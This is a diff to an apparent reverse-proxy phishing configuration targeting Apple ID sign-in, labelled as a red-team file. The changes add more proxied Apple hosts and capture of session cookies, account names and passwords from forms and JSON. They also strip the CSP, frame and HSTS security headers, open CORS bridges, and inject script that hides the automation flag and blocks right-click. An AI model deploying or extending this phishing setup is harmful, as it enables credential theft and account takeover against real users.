@@ -1,24 +1,48 @@
 name: "Apple-ID"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "appleid"
     target: "appleid.apple.com"
-auth_urls: ["/"]
-landing_path: ["/"]
+  - subdomain: "cdn"
+    target: "appleid.cdn-apple.com"
+  - subdomain: "www"
+    target: "www.apple.com"
+auth_urls: 
+  - "/"
+  - "/account/manage"
+landing_path: 
+  - "/"
 auth_tokens:
   - {type: "cookie", name: "myacinfo"}
   - {type: "cookie", name: "itspod"}
+  - {type: "cookie", name: "dqsid"}
+  - {type: "cookie", name: "acn01"}
 credentials:
   - {type: "post_param", name: "accountName", regex: null}
   - {type: "post_param", name: "password", regex: null}
-injections: []
+  - {type: "json_field", name: "accountName", regex: null}
+  - {type: "json_field", name: "password", regex: null}
+injections:
+  - trigger_path: "/"
+    position: "body_end"
+    content: |
+      (function(){
+        // Apple Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites: []
 cookie_rewrites: []
 blocklist:
   - {pattern: "analytics|/ac/globalnav/|/static/|metrics", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action]", action_to: "/auth/signin"}
+bridges:
+  - {prefix: "/_cdn/", target_host: "appleid.cdn-apple.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_www/", target_host: "www.apple.com", strip_prefix: true, cors: "allow_all"}
